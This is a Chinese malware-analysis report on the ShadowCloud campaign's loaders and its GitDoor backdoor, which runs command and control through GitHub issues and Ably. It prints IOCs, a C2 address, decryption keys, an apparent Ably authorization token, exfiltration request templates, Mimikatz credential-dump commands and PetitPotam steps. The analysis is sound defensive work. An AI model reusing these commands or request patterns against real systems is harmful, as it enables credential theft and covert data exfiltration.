---
title: 【微信】“ShadowCloud行动”：基于云服务的后门，针对亚洲和非洲的政府网络。第一部分
source: https://mp.weixin.qq.com/s/YqQ1jk8wjdqvkI2og10fBw
source_host: mp.weixin.qq.com
clip_date: 2026-11-19T11:40:12+08:00
trace_id: ec87774b-2a0a-4878-ad53-f7cdbf23b8d8
content_hash: 063ba1404c554b155b778be695cce8d930d8a0688a997b2683574fc664cc80bc
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 7
  succeeded: 7
  failed_urls: []
notion_page_id: 41d75244-d011-818e-8f35-e4761056c98f
ioc:
  cves: []
  cwes: []
  hashes:
    - "12345678901234567890123456789012"
    - 14ec33ea808e697870d00c5e434c2952
    - 32151547d912488ac5242731057170a3
    - 3896d44bc6d517291c60ee3f70543a31
    - 552f0a9cc5fc3755721fa49be05e8035
    - 6a54f8008ee659b6923abf5dba2b2cc1
    - 74b025084026d8d9a64661bf995d835b
    - 84802caf2579cfe7a38f079a64a3cd22
    - 8b78ef5609d942036e93721d75bd1f29
    - b930fb3ab14fe45b378d5acfa6e0a763
    - be739a7036dc8e2ee8608fba13c8c3a4
    - d955d03104f988582cbd2967177693d3
    - e63ec733393e4e7e3424cbff918003a3
    - e9d4081fac4a5111e6856f333d490439
  domains: []
  tools: []
  techniques: []
---

**网络与信息安全参考** *2026年11月18日 08:00*

QUOTE

当一台被感染的机器只需要读取一个公开仓库、在 issue 里打上一个标签就能领受指令时，网络边界上那些熟悉的检测规则，几乎全部失效了。

—— Saurabh Sharma & Noushin Shabab

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f2797408bacbb13c.jpg)

— 本文封面图｜图片来源：Kaspersky Securelist

2026 年初，我们发现了一场仍在活跃的入侵活动，将其命名为 Operation ShadowCloud。该活动背后的威胁行为者滥用合法的 MeshAgent 工具投递两个全新的后门。这些植入体将命令与控制（C2）流量隐藏在 **Microsoft SharePoint、GitHub 和 Ably** 等云服务之后，使植入体得以混入正常流量，从而有效规避基于网络的检测。

我们将这两个植入体命名为 **GraphDoor** 与 **GitDoor**，分别对应它们用于 C2 的云平台。尽管 C2 协议不同，两个后门共享几项关键能力：

**按需下载插件**：需要时再拉取额外模块

**内存中的 shellcode 注入**：把恶意代码直接载入内存以扩展功能，全程不落盘

威胁行为者还专门部署了修改版 Erfrp 客户端和基于 Ably 消息服务的插件，在受感染系统与 C2 服务器之间代理流量。

除插件之外，我们还发现了多个 shellcode 家族，其中大多数以 COFF（Common Object File Format，通用对象文件格式） 二进制形式投递。分析显示这是一套复杂的、模块化的工具集，仍在被持续维护与更新——我们在野外观察到了多个后门版本。受害者分布在亚洲与非洲，主要集中在政府部门。

在近期的一份简报中，Sophos 曾提及该活动的一个片段。在这篇分为两部分的博客中，我们将深入细节：后门的 C2 通信方式、威胁行为者投递到受害机器的各类 shellcode 家族与插件，以及我们观察到的、支撑这次行动的基础设施。我们同时给出归因线索：

本文（上篇）讨论初始感染向量、 **GitDoor 后门**，以及威胁行为者投放到目标机器上的多个 shellcode 家族。

下篇将详述 **GraphDoor 后门** 与插件套件（键盘记录、进程列表、屏幕截取、修改版 Erfrp 代理和 Ably 信道代理），并检视指向中文语种威胁组织的证据。

本文看点

01

一个合法远程管理工具，如何变成投递通道

02

把 GitHub issue 改造成命令总线

03

十六类自定义 shellcode 能力清单

01

INTRODUCTION

### 引言

这是一套把云平台当作信道的基础设施：不用自建 C2 服务器，只需一个 GitHub 账号、一个 Ably 应用，就能指挥一台位于政府内网的机器。上篇聚焦入侵的入口与 GitDoor。

在展开技术细节之前，先明确这次行动的整体形态：它不是单一恶意软件，而是一个持续迭代的工具矩阵——加载器换过实现，后门换过版本，shellcode 模块按需增补。这决定了防守方不能靠单条 IOC 解决问题，而要看行为链。

02

INITIAL INFECTION

### 初始感染

调查过程中，我们在中国台湾地区的一家机构内部发现了两个独立运行的 MeshCentral Agent（MD5：74b025084026d8d9a64661bf995d835b）。MeshCentral 是一款基于 Web 的工具，提供远程桌面控制、命令行访问和文件管理能力。

攻击者安装该 agent 的确切入口尚不明确，但证据指向对网络中已有的一次先前感染的复用。

该 MeshCentral Agent 被硬编码为连接远端服务器 wss://27.102.66\[.\]162:443/agent.ashx。C2 会话建立之后，攻击者利用这个 agent 在端点上下发了三个额外对象：

一个用于 **DLL 侧加载** 的合法二进制文件

一个负责解包并执行后续代码的 **恶意加载器 DLL**

一个包含核心载荷的 **加密文件**

**第一例**：

INSTANCE 1

C:\\windows\\system32\\start.exe: legitimate Sandboxie Start binary

C:\\windows\\system32\\sbiedll.dll: malicious loader

C:\\windows\\system32\\config.ini: encrypted backdoor file

**第二例**：

INSTANCE 2

C:\\Windows\\system32\\dts\\pc\\apo4x\\dtsapo4service.exe: legitimate Python application binary

C:\\Windows\\System32\\dts\\pc\\apo4x\\python39.dll: malicious loader

C:\\windows\\system32\\dts\\pc\\apo4x\\config.ini: encrypted backdoor file

威胁行为者使用受信任的可执行文件来侧加载恶意加载器 DLL。我们在这些攻击中识别出的加载器包括 jli.dll、SbieDll.dll、python39.dll、WINMM.dll 和 libcef.dll，它们被投放到主机上，随后由各自对应的合法二进制隐式加载：OpenJDK 平台二进制（javaw.exe，MD5：8b78ef5609d942036e93721d75bd1f29）、Sandboxie Start（start.exe，MD5：be739a7036dc8e2ee8608fba13c8c3a4）、一个 Python 应用（pythonw.exe，MD5：84802caf2579cfe7a38f079a64a3cd22），以及 Sysinternals 屏幕放大镜工具（zoomit.exe，MD5：d955d03104f988582cbd2967177693d3）——后者被攻击者注册为 Windows 服务启动。

注意：MeshAgent 与上述可执行文件本身都是合法软件。检测的落点不在文件名，而在「合法二进制 + 同名侧加载 DLL + 同级 config.ini」这一组合关系。

03

LOADERS

### 加载器

我们发现了两个不同的加载器，各自采用不同方法解码加密的后门载荷。两种情况下，加载器都先解密载荷，再把结果代码注入当前进程的内存。 **1 型加载器** 采用混合方案：先对数据施加 RC4 流密码，再叠加一层 XOR 掩码； **2 型加载器** 则把流程简化为单一的 XOR 运算。

1 型加载器

MD5 32151547d912488ac5242731057170a3

加载器 jli.dll 通过原生 NtCreateFile/NtReadFile 调用读取同级目录下的 config.ini（MD5：3896d44bc6d517291c60ee3f70543a31），随后通过以下步骤转换所得数据，生成最终的后门：

使用自定义字符集（ABCDEFGHIJ01234ZYXWVUTSRQPONMLKzyxwvutsrqponmlkjihgfedcba98765/+）对数据做 Base64 解码

用 16 字节 RC4 密钥解密第一层加密，密钥因样本而异

用 16 字节 XOR 密钥解密第二层加密，密钥同样因样本而异

滥用 RtlEthernetAddressToStringA 与 RtlEthernetStringToAddressA 两个 API 转换解密后的后门字节，用以规避防御。首先用 RtlEthernetAddressToStringA 把解密后的后门字节转换成以太网 MAC 地址字符串。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/80e4cfd3fecc75ab.png)

— 图 1：把解密后的字节序列转换为 MAC 地址字符串。十六进制视图右侧已可读出形如 4D-5A-45-52-E8-0 的 MAC 串

随后用 RtlEthernetStringToAddressA 把人可读的 MAC 地址字符串翻译回六字节二进制格式，得到的字节被写入一块通过 AllocADsMem API 调用新分配的内存。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b4a2d0282336d32a.png)

— 图 2：把 MAC 地址字符串还原为字节。还原后的起始字节为 4D 5A（MZ），即一个 PE 映像的开头

最后，加载器用 VirtualProtect 把内存保护属性改为 PAGE_EXECUTE_READWRITE，并跳转到 MZ 头——该处充当进入引导代码的跳板。由于解密后的后门可执行文件已经是内存映射格式，引导代码只需完成重定位、解析导入，并根据载荷是 EXE 还是 DLL 来调用其入口点。引导代码动态解析 API 地址，并使用 CRC32 计算每个 API 名称的哈希。在解析之前，导入库名与对应的 API 名都会先用硬编码的 7 字节密钥 \\x11\\xAF\\xCE\\xDC\\xA6\\x12\\x05 做 XOR 解密。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d1f35d53eaed7bff.png)

— 图 3：从 MZ 字节开始执行。以 4D 5A 打头，随后是定位自身基址、计算偏移并跳转至引导代码的指令序列

另一个同名的加载器 jli.dll（MD5：e9d4081fac4a5111e6856f333d490439）在 API 解析上采取了不同做法。它从 config.ini（MD5：b930fb3ab14fe45b378d5acfa6e0a763）读取一段加密 blob，解密后得到一个引导代码，以及一个后门可执行文件（GraphDoor，MD5：14ec33ea808e697870d00c5e434c2952）——该文件可以是 EXE，也可以是 DLL。引导代码使用 FNV-1 哈希解析所需 API；在 API 哈希函数中，FNV_offset_basis 的值会变化，但 FNV_prime 常量始终为 0x1000193。所需函数解析完成后，引导代码创建一个名为 Local\\sm%lu 的文件映射对象（其中 %lu 为当前 PID）。接着，它以反射方式把后门加载进自己的进程空间，并跳转到后门的入口点。若载荷是 DLL 且带有导出函数，则每个导出名都会用 FNV-1 哈希，并与硬编码值 0x974C9EB 比较，匹配即触发该导出。清理阶段，引导代码以 DLL_PROCESS_DETACH 调用 DLL 的 DllMain，通过 FreeLibrary 卸载已加载的库，并用 VirtualFree 释放已分配的内存。

2 型加载器

MD5 e63ec733393e4e7e3424cbff918003a3

该加载器内部名为 SbieDll_st.dll。在尝试准备并执行后门之前，它会先在受感染的机器上做几项检查：首先在 KERNEL32.DLL 与 KernelBase.dll 中搜索字节序列 \\x48\\x83\\xC4\\x68\\xC3——该序列反汇编后如下所示。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/ee65b3621e3322fd.png)

— 图 4：模式反汇编。48 83 C4 68 对应 add rsp, 68h，C3 对应 retn

若找到该模式，代码会先安装一个向量化异常处理程序，并通过把 CONTEXT.DR7 寄存器清零来清除硬件断点。随后它校验当前进程名是否匹配硬编码值。通过这些检查之后，它读取模块目录下 config.ini（MD5：6a54f8008ee659b6923abf5dba2b2cc1）中的加密 blob，再按以下步骤转换数据：

Base64 解码

用硬编码的 16 字节密钥做 XOR 解密，密钥因样本而异

得到的结果是一个后门可执行文件（GitDoor，MD5：552f0a9cc5fc3755721fa49be05e8035）。加载器在当前进程中分配内存，把解密后的后门代码复制到该区域，并在 MZ 头处启动一个新线程——MZ 头充当跳板，进入与 1 型加载器完全相同的引导例程。在分配内存并执行后门代码之前，加载器会检查操作系统版本：在 Windows 8（6.2）或更新版本上，它使用原生 API NtAllocateVirtualMemory、RtlMoveMemory 和 NtCreateThreadEx 完成内存分配与代码执行；在更早的系统上，则回退到标准 API VirtualAlloc、RtlMoveMemory 和 CreateThread。

04

BACKDOORS

### 后门

GitDoor 与 GraphDoor 都采用了多种加密与混淆技术，其中包括控制流平坦化（Control Flow Flattening），用以掩盖真实的执行流。它们还大量使用间接调用：大多数例程被封装在多层辅助函数之中，彼此依次调用，形成额外的间接层级。核心载荷深藏于这些嵌套包装之内，分析人员必须逐层跟踪每一层包装才能理解后门的真实行为，这极大阻碍了静态分析。

执行过程被拆分到多个线程组件。每个线程都是 ably 命名空间中 Client 类的一个实例。类名与命名空间标识都来自经名称修饰（name mangling）的 C++ 线程函数名，而伴生的 lambda 名称则直接暴露了每个线程所实现的具体恶意能力。

GitDoor 后门

MD5 552f0a9cc5fc3755721fa49be05e8035

该后门首先解密联系 GitHub C2 所需的每一项要素——仓库 URL、个人访问令牌、User-Agent 字符串以及必要的 HTTP 头。后门使用两个不同的仓库：一个作为接收命令载荷的投放点，另一个用于上传命令执行结果。

/repos/LatonyCharnleyaW/Havo：下载命令数据与插件

/repos/LatonyCharnleyaW/Trix：上传受害者信息与命令结果

User-Agent 字符串为：

USER-AGENT

Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)

Chrome/122.0.6261.96 Safari/537.36

后门解密硬编码的配置细节，把它们附加到已收集的受害者系统信息之后，再将合并后的数据上传到 GitHub 仓库以及 Ably 云——详细的准备与上传流程见下文。

**硬编码细节**

HARDCODED

"type":"serv"

"client_version":"1.1.6"

"dhj_exe":"start.exe"

"execution_method":"1"

"is_need_lock":"false"

**受害者信息**

VICTIM INFO

Public IP

Internal IP

Domain

Username

Hostname

Current working directory

Backdoor process name and process ID

Windows version

CPU type

Running process name

后门会生成一个随机的八字符标识符，用于唯一标记被入侵主机，并创建一个新的 GUID 来标记当前通信会话。每次 HTTP 调用都会在 X-CSRF-TOKEN 头中插入一个新生成的随机字符串。随后，恶意软件向 GitHub 发出 POST 请求，利用 GitHub API 在属于 LatonyCharnleyaW 用户/组织的 Trix 仓库中开启一个新的 issue。该请求创建一条新的 GitHub issue，其标题与正文如下所示。恶意软件从 JSON 响应中提取 number 字段，即该 issue 的编号，用于后续请求。

Title："problem \[GUID\]"

Body："code \[victim unique code\]"

HTTP

POST /repos/LatonyCharnleyaW/Trix/issues

Host: api.github.com

Authorization: token %github_pat_token%

Accept: application/json

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

X-CSRF-TOKEN: %random string%

Content-Type: application/json

{"body":"code %victim_unique_code%","title":"problem %generated GUID%"}

后门还会连接 rest.ably.io 上的 Ably 服务，使用一个硬编码的授权令牌。该令牌经 Base64 编码，解码后即暴露 Ably API 密钥，其中包含以下信息：

**App ID**：标识具体的 Ably 应用

**Key ID**：标识该应用内的具体密钥

**Key Secret**：用于对请求签名的私有密钥

随后，后门按 main.%victim_unique_code%.js.map 的格式构建一个唯一文件名，其中 %victim_unique_code% 对应创建 GitHub issue 时上报的值。该文件在 Ably 云与 GitHub 仓库两处同时承载采集到的受害者系统信息。上传之前，受害者系统信息会用随机生成的密钥以 AES-256-ECB 加密，密文经 Base64 编码后封装进一个 JSON 对象（见下例）。

JSON

{"key": "<%randomly generated AES key%>", "sec": "<%AES-encrypted and base64-encoded victim system information%>"}

此后，整个 JSON 载荷会用先前构建的唯一文件名做 XOR 加密，再次 Base64 编码，最终通过 POST 请求发送到 Ably 服务，并通过 PUT 请求写入 GitHub 仓库。

下面是把加密后的受害者数据发送到 Ably 云的 POST 请求。

HTTP

POST /messages

Host: rest.ably.io

Accept: application/json

Authorization: Basic VHVGY3FnLjlId1ZxQTpIVmJEdnUwb1JidG1YQThybE1TVzM1QUJNUjZoOFMxLVMtZnpMVkFYY0dr

Content-Type: application/json

\[{"channels":"data:main.%victim_unique_code%.js.map","messages":{"data":{"content":{%encrypted collected victim system info%},"name":"part-1"}}}\]

数据发送到 Ably 云之后，恶意软件会查询 /channels/comm/messages?limit=50，从而暴露出信道名 comm。该请求充当状态检查，用于拉取任何错误或成功响应。若响应表明失败，恶意软件会把相同载荷重发到 /channels/data/messages 以重试。

为了把采集到的受害者系统信息上传到 GitHub 仓库，后门首先向 /repos/LatonyCharnleyaW/Trix/contents/main.%victim_unique_code%.js.map 发出 GET 请求，检查该文件是否已经存在。若返回 “not found”，恶意软件随后发出一个 PUT 请求（见下例），在仓库中创建该文件以存储受害者信息。

HTTP

PUT /repos/LatonyCharnleyaW/Trix/contents/main.%victim_unique_code%.js.map

Host: api.github.com

Authorization: token %github_pat_token%

Accept: application/json

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

X-CSRF-TOKEN: %random string%

Content-Type: application/json

{"content":"%encrypted collected victim system info%","message":"commit from INSOMNIA"}

一旦受害者系统信息上传成功（或文件已存在），恶意软件便会下载两个插件，分别执行屏幕截取（scr.ts）与进程枚举（pr.ts）。

下载每个插件时，后门先解密插件文件名以及对应的 GitHub 仓库路径，然后发出 GET 请求获取插件的加密内容。以下是下载 scr.ts 与 pr.ts 插件的 HTTP 请求。

HTTP

GET /repos/LatonyCharnleyaW/Havo/contents/scr.ts

Host: api.github.com

Authorization: token %github_pat_token%

Accept: application/vnd.github.raw+json

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

X-CSRF-TOKEN: %random string%

HTTP

GET /repos/LatonyCharnleyaW/Havo/contents/pr.ts

Host: api.github.com

Authorization: token %github_pat_token%

Accept: application/vnd.github.raw+json

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

X-CSRF-TOKEN: %random string%

插件使用一套自定义的两阶段解密例程来解包载荷：

**阶段 1（AES-256-ECB）**：使用硬编码密钥 12345678901234567890123456789012，按 16 字节块解密密文。

**阶段 2（自研 XOR 密码）**：阶段 1 的输出用 16 字节密钥做滚动 XOR 运算。首个块使用静态初始密钥（\\x65\\x3c\\x40\\x16\\x3d\\x38\\x20\\xa4\\x47\\x14\\x54\\xb4\\x37\\x5a\\x3b\\x38）解密；对于后续所有块，例程采用链式效应，密钥由紧邻前一个块的密文派生。

解密完成后，所得字节即插件的 shellcode，后门将其直接加载进内存。

加载插件之后，后门发出 POST 请求，为新创建的 issue（以编号标识）打上 bug 标签。请求如下。

HTTP

POST /repos/LatonyCharnleyaW/Trix/issues/<issue_number>/labels?rd=%random alphanumeric characters% HTTP/1.1

Host: api.github.com

Connection: Keep-Alive

Content-Type: application/json

Accept: application/json

Authorization: token %github_pat_token%

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

X-CSRF-TOKEN: %random string%

Content-Length: 18

{"labels":\["bug"\]}

若该 issue 已经带有 bug 标签，后门则发出 DELETE 请求移除该标签。

HTTP

DELETE /repos/LatonyCharnleyaW/Trix/issues/<issue_number>/labels/bug?rd=%random alphanumeric characters% HTTP/1.1

Host: api.github.com

Connection: Keep-Alive

Content-Type: application/json

Accept: application/json

Authorization: token %github_pat_token%

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

X-CSRF-TOKEN: %random string%

打标签／取消标签的请求之后，总是紧跟一个拉取 Havo 仓库内容的 GET 请求。

HTTP

GET /repos/LatonyCharnleyaW/Havo/contents HTTP/1.1

Host: api.github.com

Connection: Keep-Alive

Content-Type: application/json

Accept: application/json

Authorization: token %github_pat_token%

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

X-CSRF-TOKEN: %random string%

后门会持续发送这两个请求——给 issue 打／取消 bug 标签、拉取仓库内容——直到它收到一条 exit 命令为止。

内容获取请求返回一个 JSON 数组，列出文件名以及包括文件下载路径在内的若干其他细节。列表中的每个文件都含有待处理的命令数据。后门提取 name 属性得到每个文件名，然后在名称中搜索唯一的受害者代码字符串。一旦命中，便通过 /repos/LatonyCharnleyaW/Havo/contents/<filename> 获取该文件，并按「命令处理」一节所述的方式处理命令数据。

命令处理

如前所述，命令输入与命令结果被存放在两个不同的 GitHub 仓库中。在分析的样本里，命令输入从公开的 Havo 仓库获取，而命令结果上传到私有的 Trix 仓库——访问后者需要 GitHub 个人访问令牌。通过访问下表中相应的文件，即可从 GitHub 仓库获取命令及其关联数据。命令输入文件遵循命名模式 main.<%victim_unique_code%>.<%random 4-character string%>.js.<%extension%>，其中 <%victim_unique_code%> 是创建 GitHub issue 时上报的标识符，<%extension%> 则指明命令数据类型：kmap 表示键盘记录数据，pmap 表示代理数据，apmap 表示 Ably 代理数据，swp 与 tmp 表示文件管理器数据，而 shellcode 数据则为「无扩展名」——文件名以.js 结尾，不带任何额外扩展名。

| 命令类型 | 示例 GitHub 路径 |
| --- | --- |
| 加载 Shellcode 命令 | /repos/LatonyCharnleyaW/Havo/contents/main.w8i6lyr9.rikh.js |
| 键盘记录命令 | /repos/LatonyCharnleyaW/Havo/contents/main.r256zin8.xuqa.js.kmap |
| 代理命令 | /repos/LatonyCharnleyaW/Havo/contents/main.PW7ickVf.ym30.js.pmap |
| Ably 代理命令 | /repos/LatonyCharnleyaW/Havo/contents/main.w5y2t1qs.n4wq.js.apmap |
| 文件管理器命令 | /repos/LatonyCharnleyaW/Havo/contents/main.hmxjfyrc.q4d0.js.swp |
| 文件管理器命令 | /repos/LatonyCharnleyaW/Havo/contents/main.hmxjfyrc.bmns.js.tmp |

文件内容先经 Base64 解码，再以文件名作为 XOR 密钥解密。由此得到如下格式的 JSON 数据，其中包含一个 AES 密钥，以及既经 Base64 编码、又经 AES 加密的命令数据。

JSON

{"key": "<%AES key%>", "sec": "<%base64-encoded and AES-encrypted command data%>"}

每一类命令下都有多条可用命令。以下是各命令类型支持的命令说明：

文件管理器

createFolder：在指定位置创建文件夹

loadDrives：获取驱动器名称列表

scanDir：列出指定位置的文件与文件夹

deleteFile：删除指定文件

uploadFile：在指定位置创建文件。写入文件的数据以分块形式从 C2 接收

downloadFile：读取指定位置的文件，并以分块形式发送到 C2 服务器

键盘记录

start：开始捕获击键

stop：停止捕获击键

status：检查键盘记录处于启用还是停用状态

info：发送已捕获的击键内容

autoStartUp：检查文件 %APPDATA%\\log.lock 是否存在，若不存在则创建

stopAutoStartUp：检查文件 %APPDATA%\\log.lock 是否存在，若存在则删除

autoStartUp_status：检查文件 %APPDATA%\\log.lock 是否存在。若存在，发送字符串 enable；否则发送字符串 disable

后门样本启动时，会检查文件 %APPDATA%\\log.lock 是否存在。若存在，则发出 start 命令启动键盘记录。

代理

start：把收到的代理插件配置存入名为 Local\\pc<%current_process_id%> 的共享内存段。配置包含 serverAddr、serverPort、remote_port、socks5_user 和 socks5_password 字段。接着从 Havo GitHub 仓库（在分析的样本中）下载 channel.ts 代理插件，最后把下载到的插件代码注入内存

stop：向共享内存写入字符串 False，并把代理状态置为 Disable

status：若代理正在运行，状态置为 Enable；否则置为 Disable

info：根据从共享内存中读到的字符串发送以下消息

若共享内存中包含字符串 True，发送字符串 connected 并附上代理配置

若共享内存中包含字符串 False 或 connecting，发送字符串 not connect

对于任何其他字符串，发送字符串 Connecting

Ably 代理

start：把收到的代理插件配置存入名为 Local\\pcs<%current_process_id%> 的共享内存段。配置包含 Ably 的 ChannelName 与 Token。接着从 Havo GitHub 仓库（在分析的样本中）下载 abchannel.ts Ably 代理插件，最后把下载到的插件代码注入内存

stop：向共享内存写入字符串 False，并把 Ably 代理状态置为 Disable

status：若 Ably 代理正在运行，状态置为 Enable；否则置为 Disable

info：根据从共享内存中读到的字符串发送以下消息

若共享内存中包含字符串 True，发送字符串 connected

若共享内存中包含字符串 False 或 connecting，发送字符串 not connect

对于任何其他字符串，发送字符串 Connecting

加载 Shellcode

exit：终止后门

sleep：让后门进入睡眠状态，持续指定的时间间隔

publicip：从 https://ip.sb/ 获取受害者的公网 IP 地址并发送给 C2

scload：输入由 Base64 编码的 COFF（Common Object File Format）字节和可选载荷参数组成。COFF 字节经 Base64 解码、载入内存后，调用入口函数 go。随附的参数同样经 Base64 解码后传给 go 函数

smload：输入数据包含 Base64 编码的载荷字节和可选载荷参数。解码后，载荷字节可能是 MZ 可执行文件，也可能是 shellcode（由 stub 与可执行代码组成），二者都会被注入内存。载荷参数经 Base64 解码后写入名为 Local\\sm<%current_process_id%> 的共享内存段

自定义 shellcode

我们的分析发现了若干由威胁行为者自行编写的 shellcode，每一个都针对特定功能（见下）。按其操作逻辑，这些 shellcode 可以归入以下几大类：

进程注入技术

CreateRemoteThread：实现 Windows 远程线程创建技术以完成进程注入

SetThreadContext injection（线程执行劫持）：实现 Windows 线程上下文操纵技术以完成远程代码注入

NtQueueApcThread：使用 NTDLL 系统调用（而非经由 Windows API）实现 APC（异步过程调用）注入

KernelCallbackTable：使用 NTDLL 系统调用（而非经由 Windows API）操纵进程回调表，在目标进程中实现代码执行

Windows 服务活动

EnumServices：枚举系统上所有 Windows 服务，并输出每个服务的详细信息，包括：

基础服务信息：名称、显示名、类型、状态

服务配置：二进制路径、启动类型、依赖关系

扩展属性：重置周期、重启消息、命令行

服务依赖：基于 UUID 的依赖信息

CreateService：使用 Windows 服务控制管理器 API 创建新的 Windows 服务

start_service：启动一个 Windows 服务

stop_service：停止一个 Windows 服务，必要时连同其依赖服务一起停止

DeleteService：使用 Windows 服务控制管理器 API 移除已有 Windows 服务

文件系统活动

MakeDir：在指定路径创建目录

ListDir：递归枚举文件与目录

WipeFileContent：以零覆盖的方式安全擦除文件内容

DeleteDirectoryRecursively：删除文件、子目录以及目录本身，可选择同时擦除文件

PathFileExists：检查文件是否存在

网络活动

Netstat：显示活动 TCP 连接及对应进程信息，类似 Windows 的 netstat 命令

ARP：显示本地网络中映射到 MAC 地址的 IP 地址

Firewall：添加、删除并枚举入站与出站防火墙规则

Fileupload：把文件上传到 upload.gofile.io

IPInfo：获取网络适配器名称、类型、描述、MAC 地址、IP 地址、主机名、DNS 后缀与 DNS 服务器

进程活动

Procdump：把指定进程 ID 的进程内存转储到指定文件

TerminateProcess：终止指定进程 ID 的进程

GetProcessUserInfo：获取 SeDebugPrivilege 权限，并取出 explorer.exe 与 winlogon.exe 两个进程的进程 ID、域和用户账户名

命令 Shell 活动

Execute command：使用 cmd.exe 执行指定命令

WinPTY shell：使用 WinPTY 创建一个完全交互式的反弹 shell，支持以下环节：

Initialization：解码硬编码的 Base64 字符串，得到 winpty.dll（WinPTY 核心库）与 winpty-agent.exe（用于终端管理的辅助可执行文件），并把两者释放到 %TEMP% 目录

Setup：加载 WinPTY，创建终端配置，并把终端尺寸设为 80 × 25

Spawn：以正确配置的管道启动 cmd.exe

Communication：启动读线程与写线程。写线程监听 \\\\.\\pipe\\MyInputPipe，等待来自 C2 服务器的命令

Wait：监控退出条件。当从 C2 服务器收到字符串 hklnwqxaa123 时，发送 exit\\r 并终止

command-forwarder：打开由 WinPTY shell 创建的命名管道 MyInputPipe，把格式化后的命令（添加回车符、添加空终止符）写入该管道

计划任务活动

EnumTasks：枚举 Windows 计划任务（任务计划程序作业）并显示每个任务的详细信息。对每个找到的任务，获取：任务名、任务路径、启用状态、上次运行时间、下次运行时间、当前状态

CreateTask：使用任务计划程序 COM API 创建新的 Windows 计划任务

RunTask：使用任务计划程序 COM API 执行一个 Windows 计划任务

注册表活动

注册表命令行工具（Registry CLI）：

递归枚举 Windows 注册表键与值

使用 RegQueryValueExW 等 Windows API 函数从指定键读取注册表值

SetRegKey：在 Windows 注册表中设置一个值

用户信息

whoami：模仿 whoami 命令的功能

显示当前用户名与 SID 信息

枚举并显示与当前用户令牌关联的组，类似 whoami /groups 命令行工具

显示 Windows 中与当前用户令牌关联的权限，类似 whoami /priv 命令

EnumNetUser：使用 Windows NetAPI 枚举本地或远程系统上的用户

模式 1：列出所有用户

模式 2：仅列出管理员用户

模式 3：仅列出已启用的用户

模式 4：仅列出活跃用户

ListServerGroups：枚举指定服务器上的本地组

ListServerGroupMembers：枚举指定本地组的成员

AddUser：使用 NetUserAdd API 创建新的 Windows 用户账户

AddUserToGroup：把用户加入某个组（全局组或本地组）

键盘记录

把击键内容写入以下路径的文件：%APPDATA%\\Microsoft\\SystemCertificates\\Cache\\logs.dat

浏览器 Cookie 窃取

使用 CookieKatz 直接从进程内存中转储 Chrome、Edge 或 Msedgewebview2 的 Cookie。

凭据转储

**Mimikatz**：该工具命名为 imzimzgo 2.2.0 x64，使用以下参数：

sekurlsa::logonpasswords full 是 Mimikatz 中的命令，用于从 Windows LSASS 内存空间提取用户名、NTLM 哈希与明文口令。附加 full 参数会强制工具进行更深入的搜索，并显示活动用户会话的所有可用主、次凭据块。

lsadump::sam 是 Mimikatz 中的命令，用于从 Windows 安全账户管理器（SAM）数据库中提取本地用户账户的 NT 与 LM 口令哈希。

截图

截取整个屏幕，或截取由 PID 标识的特定窗口。

WhatsAppKey

提取 WhatsApp 数据库的解密密钥。该模块带有的 PDB 路径为：C:\\src\\Dll1\\WhatsAppCS\\x64\\Release\\WhatKeyCPP.pdb

PetitPotam

滥用 EFSRPC，迫使目标向攻击者控制的目的地发起 NTLM 认证。它接受两个参数：<EFSRPC operation> 与 <executable_path>，并执行下述操作。

创建一个名为 \\\\.\\pipe\\%08X\\pipe\\srvsvc 的管道，其中 %08X 是一个随机生成的八位大写十六进制值

若到该命名管道的连接成功，则启动指定的可执行文件。若 winlogon.exe 进程正在运行，则把它设为所启动进程的父进程

使用以下参数创建 RPC 绑定：

UUID：df1941c5-fe89-4e79-bf10-463657acf44d – \\PIPE\\efsrpc

协议：ncacn_np

地址：127.0.0.1

构造 Windows UNC 路径 \\\\localhost\\pipe\\<%random 8 chars%>\\C$\\hiddenfile.txt

调用指定的 EFSRPC 操作（如 EfsRpcOpenFileRaw），并把该 UNC 路径作为参数之一传入

杂项

ShowLastActiveTime：显示用户最后一次活动（鼠标移动、键盘输入）的时间，并计算系统已空闲多久

HexToBytes：把十六进制字符串转换为其二进制字节表示

命令响应被封装在一个 JSON 对象中（见示例）。真实数据出现在 res 属性里，而 result_type 字段说明输出属于哪一类。result_type 的可接受值为：keylogger_msg、keylogger_status、keylogger_autoStartUp_status、proxy_info、proxy_status、ablyProxy_info、ablyProxy_status、scanDir、loadDrives、uploadFile、downloadFile 以及 command_result。

JSON

{"guid":"2l0p5io1-gn95-y896-aqlx-idgcacgft7us","randomnum":"iq02spzcmt","res":{%command result%},"result_type":"%command type%","type":"serv"}

该 JSON 对象首先用随机生成的密钥以 AES-256-ECB 加密，再做 Base64 编码。随后，这段密文用目标文件名做 XOR 加密，再次 Base64 编码，最终上传到一个用于存储受害者信息的 GitHub 仓库。

JSON

{"key": "<%randomly generated AES key%>", "sec": "<%AES-encrypted and base64-encoded command output%>"}

